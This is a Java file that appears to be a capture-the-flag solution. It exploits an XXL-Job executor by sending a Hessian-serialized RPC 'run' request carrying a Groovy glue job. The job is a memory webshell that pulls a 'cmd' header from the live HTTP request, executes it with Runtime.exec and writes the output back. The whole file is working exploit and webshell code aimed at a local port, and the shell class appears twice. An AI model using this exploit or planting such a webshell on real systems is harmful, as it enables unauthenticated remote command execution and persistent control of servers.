package dev.silente.javashark.solution;

import com.xxl.job.core.biz.model.ReturnT;
import com.xxl.job.core.biz.model.TriggerParam;
import com.xxl.job.core.handler.IJobHandler;
import com.xxl.job.core.rpc.codec.RpcRequest;
import com.xxl.job.core.rpc.codec.RpcResponse;
import com.xxl.job.core.rpc.serialize.HessianSerializer;
import org.asynchttpclient.AsyncCompletionHandler;
import org.asynchttpclient.AsyncHttpClient;
import org.asynchttpclient.DefaultAsyncHttpClient;
import org.asynchttpclient.Response;

import java.io.IOException;
import java.util.Date;

public class DASCTFSummer2024 {
    private static void sendData(String url, byte[] bytes) {
        AsyncHttpClient c = new DefaultAsyncHttpClient();
        try{
            c.preparePost(url)
                    .addQueryParam("cmd", "whoami")
                    .setBody(bytes)
                    .execute(new AsyncCompletionHandler<Response>() {
                        @Override
                        public Response onCompleted(Response response) throws Exception {
                            System.out.println("Server Return Data: ");
                            System.out.println(response.getResponseBody());
                            return response;
                        }

                        @Override
                        public void onThrowable(Throwable t) {
                            t.printStackTrace();
                            super.onThrowable(t);
                        }
                    }).toCompletableFuture().join();

            c.close();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                c.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) {
        String code = "package dev.silente.javashark.template.memshell;\n" +
                "\n" +
                "import com.xxl.job.core.biz.model.ReturnT;\n" +
                "import com.xxl.job.core.handler.IJobHandler;\n" +
                "import java.io.InputStream;\n" +
                "import java.util.ArrayList;\n" +
                "import java.util.Scanner;\n" +
                "\n" +
                "public class DemoGlueJobHandler extends IJobHandler {\n" +
                "    public DemoGlueJobHandler() throws Exception {\n" +
                "        try {\n" +
                "            Class clazz = Thread.currentThread().getClass();\n" +
                "            java.lang.reflect.Field field = clazz.getDeclaredField(\"threadLocals\");\n" +
                "            field.setAccessible(true);\n" +
                "            Object obj = field.get(Thread.currentThread());\n" +
                "            field = obj.getClass().getDeclaredField(\"table\");\n" +
                "            field.setAccessible(true);\n" +
                "            obj = field.get(obj);\n" +
                "            Object[] obj_arr = (Object[]) obj;\n" +
                "            for(int i = 0; i < obj_arr.length; i++){\n" +
                "                Object o = obj_arr[i];\n" +
                "                if(o == null) continue;\n" +
                "                field = o.getClass().getDeclaredField(\"value\");\n" +
                "                field.setAccessible(true);\n" +
                "                obj = field.get(o);\n" +
                "                if(obj != null && obj.getClass().getName().endsWith(\"HttpConnection\")) {\n" +
                "                    java.lang.reflect.Method method = obj.getClass().getDeclaredMethod(\"getHttpChannel\", null);\n" +
                "                    Object httpChannel = method.invoke(obj, null);\n" +
                "                    method = httpChannel.getClass().getMethod(\"getRequest\", null);\n" +
                "                    obj = method.invoke(httpChannel, null);\n" +
                "                    method = obj.getClass().getMethod(\"getHeader\", String.class);\n" +
                "                    String cmd = (String)method.invoke(obj, \"cmd\");\n" +
                "                    System.out.println(\"cmd: \" + cmd);\n" +
                "                    if(cmd != null && !cmd.isEmpty()){\n" +
                "                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
                "                        System.out.println(\"res: \" + res);\n" +
                "                        method = httpChannel.getClass().getMethod(\"getResponse\", null);\n" +
                "                        obj = method.invoke(httpChannel, null);\n" +
                "                        method = obj.getClass().getMethod(\"getWriter\", null);\n" +
                "                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj, null);\n" +
                "                        printWriter.write(res);\n" +
                "                        printWriter.flush();\n" +
                "                        printWriter.close();\n" +
                "                    }\n" +
                "                    break;\n" +
                "                }\n" +
                "            }\n" +
                "        } catch (Exception e) {\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }\n" +
                "    @Override\n" +
                "    public ReturnT<String> execute(String param) throws Exception {\n" +
                "        System.out.println(\"Sakura\");\n" +
                "        return ReturnT.SUCCESS;\n" +
                "    }\n" +
                "\n" +
                "}\n";

//        System.out.println(code);

        TriggerParam params = new TriggerParam();
        params.setJobId(10);
        params.setExecutorBlockStrategy("SERIAL_EXECUTION");
        params.setLogId(10);
        params.setLogDateTim((new Date()).getTime());
        params.setGlueType("GLUE_GROOVY");
        params.setGlueSource(code);
        params.setGlueUpdatetime((new Date()).getTime());

        RpcRequest xxlRpcRequest = new RpcRequest();
        xxlRpcRequest.setClassName("com.xxl.job.core.biz.ExecutorBiz");
        xxlRpcRequest.setMethodName("run");
        xxlRpcRequest.setParameterTypes(new Class[]{TriggerParam.class});
        xxlRpcRequest.setParameters(new Object[] {params});
        xxlRpcRequest.setCreateMillisTime((new Date()).getTime());

        byte[] data = HessianSerializer.serialize(xxlRpcRequest);
        sendData("http://127.0.0.1:9999", data);
    }
}


class DemoGlueJobHandler extends IJobHandler {

    public DemoGlueJobHandler() throws Exception {
        try {
            Class clazz = Thread.currentThread().getClass();
            java.lang.reflect.Field field = clazz.getDeclaredField("threadLocals");
            field.setAccessible(true);
            Object obj = field.get(Thread.currentThread());

            field = obj.getClass().getDeclaredField("table");
            field.setAccessible(true);
            obj = field.get(obj);

            Object[] obj_arr = (Object[]) obj;
            for(int i = 0; i < obj_arr.length; i++){
                Object o = obj_arr[i];
                if(o == null) continue;

                field = o.getClass().getDeclaredField("value");
                field.setAccessible(true);
                obj = field.get(o);

                if(obj != null && obj.getClass().getName().endsWith("HttpConnection")) {
                    java.lang.reflect.Method method = obj.getClass().getDeclaredMethod("getHttpChannel", null);
                    Object httpChannel = method.invoke(obj, null);

                    method = httpChannel.getClass().getMethod("getRequest", null);
                    obj = method.invoke(httpChannel, null);

                    method = obj.getClass().getMethod("getHeader", String.class);
                    String cmd = (String)method.invoke(obj, "cmd");
                    System.out.println("cmd: " + cmd);
                    if(cmd != null && !cmd.isEmpty()){
                        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                        System.out.println("res: " + res);
                        method = httpChannel.getClass().getMethod("getResponse", null);
                        obj = method.invoke(httpChannel, null);

                        method = obj.getClass().getMethod("getWriter", null);
                        java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj, null);
                        printWriter.write(res);
                        printWriter.flush();
                        printWriter.close();
                    }
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public ReturnT<String> execute(String param) throws Exception {
        System.out.println("Sakura");
        return ReturnT.SUCCESS;
    }

}
